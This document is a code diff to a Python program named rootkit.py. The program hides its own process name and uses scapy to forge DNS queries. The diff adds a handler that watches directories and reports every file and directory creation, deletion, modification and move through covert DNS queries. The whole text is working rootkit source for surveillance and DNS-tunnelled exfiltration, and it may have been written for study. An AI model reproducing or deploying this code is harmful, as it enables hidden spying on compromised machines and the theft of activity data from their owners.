@@ -27,7 +27,7 @@ from utils.process import hide_process_name
 # Third Party Libraries
 from scapy.all import sniff, UDP, DNSQR, DNSRR, IP, DNS, send, conf
 from watchdog.observers import Observer
-from watchdog.events import PatternMatchingEventHandler, LoggingEventHandler
+from watchdog.events import PatternMatchingEventHandler, FileSystemEventHandler
 
 
 PARSER = argparse.ArgumentParser("./rootkit.py")
@@ -96,6 +96,35 @@ def on_modified(event):
 def on_moved(event):
     query = forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Moved: {event.src_path} --> {event.dest_path}", MONITOR_IDENTIFICATION)
     send_dns_query(query)
+
+# This is used for directories.
+def on_any_event(event):
+    if event.is_directory:
+        if event.type == "created":
+            query = forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - Directory Created: {event.src_path}", MONITOR_IDENTIFICATION)
+            send_dns_query(query)
+        if event.type == "deleted":
+            query = forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - Directory Deleted: {event.src_path}", MONITOR_IDENTIFICATION)
+            send_dns_query(query)
+        if event.type == "modified":
+            query = forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - Directory Modified: {event.src_path}", MONITOR_IDENTIFICATION)
+            send_dns_query(query)
+        if event.type == "moved":
+            query = forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - Directory Moved: {event.src_path} --> {event.dest_path}", MONITOR_IDENTIFICATION)
+            send_dns_query(query)
+    else:
+        if event.type == "created":
+            query = forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Created: {event.src_path}", MONITOR_IDENTIFICATION)
+            send_dns_query(query)
+        if event.type == "deleted":
+            query = forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Deleted: {event.src_path}", MONITOR_IDENTIFICATION)
+            send_dns_query(query)
+        if event.type == "modified":
+            query = forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Modified: {event.src_path}", MONITOR_IDENTIFICATION)
+            send_dns_query(query)
+        if event.type == "moved":
+            query = forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Moved: {event.src_path} --> {event.dest_path}", MONITOR_IDENTIFICATION)
+            send_dns_query(query)
 
 
 class FileSystemMonitor():
@@ -167,11 +196,12 @@ class FileSystemMonitor():
             return
         elif code == self.__DIRECTORY:
             print(f"Directory: {path}")
-            # event_handler = LoggingEventHandler()
-            # observer = Observer()
-            # observer.schedule(event_handler, path, recursive=False)
-            # observer.start()
-            # self.__threads.append(observer)
+            event_handler = FileSystemEventHandler()
+            event_handler.on_any_event = on_any_event
+            observer = Observer()
+            observer.schedule(event_handler, path, recursive=False)
+            observer.start()
+            self.__threads.append(observer)
             return
 
 
